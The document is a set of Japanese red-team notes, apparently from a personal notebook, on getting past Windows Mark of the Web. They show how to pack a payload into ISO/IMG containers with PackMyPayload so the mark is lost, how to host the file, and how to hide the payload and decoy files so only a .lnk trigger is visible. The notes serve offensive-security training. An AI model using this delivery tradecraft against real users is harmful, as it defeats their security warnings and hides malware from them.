## Mark of the Web
Mark of the Web(MotW)がインターネットからダウンロードされたファイルをマークするためのゾーン識別子

powershellでの確認方法
```powershell
PS C:\Users\Attacker\Downloads> Get-Content -Stream Zone.Identifier .\test.pdf
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf
HostUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf
```

MotWを含むファイルを開いたり実行しようとした際に、Windowsがユーザーに追加のセキュリティ警告を表示
Office文書など一部のファイルでは、MotWが存在するとマクロが有効にならない

コンテナとしてSO/IMG, ZIP, and WIMフォーマットは標準でサポートされているので使うとよい。コンテナの中には隠しファイルをサポートするものもあれば、MotWを伝播しないものももある
参考：[Windows用アーカイブソフトウェアにおけるMOTW（Mark of the Web）伝播サポートの比較](https://github.com/nmantani/archiver-MOTW-support-comparison)

[PackMyPayload](https://github.com/mgeeky/PackMyPayload)を使用したパック
```bash
attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Downloads$ /mnt/c/Tools/PackMyPayload/PackMyPayload.py test.pdf test.iso
​
[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /test.pdf
[+] File packed into ISO.
​
[+] Generated file written to (size: 65536): test.iso
```

python webサーバでホスト
```bash
attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Downloads$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

ダウンロードして中身を見てみると、MotWが伝播してないことが分かる
![](Initial%20Access/images/Pasted%20image%2020260526183341.png)

PackMyPayloadには、コンテナにパッケージ化される際にファイルにhidden属性を設定するオプションもあります。これは、デコイやペイロードなどのファイルを非表示にして、ユーザーにはトリガーのみを表示させたい場合に便利

トリガー、ペイロード、デコイの3つがあるとする
```bash
$ ls -l /mnt/c/Payloads/xlam

-rwxrwxrwx 1 rasta rasta 11607 Jun 27 13:55 decoy.xlsx
-rwxrwxrwx 1 rasta rasta 12906 Jun 27 13:55 payload.xlam
-rwxrwxrwx 1 rasta rasta  2094 Jun 28 13:55 trigger.xls.lnk
```

パラメータを使用してdecoy.xlsxとpayload.xlamを隠しながら、IMGファイルにパック
```bash
python3 PackMyPayload.py -H decoy.xlsx,payload.xlam /mnt/c/Payloads/xlam /mnt/c/Payloads/xlam/package.img
```
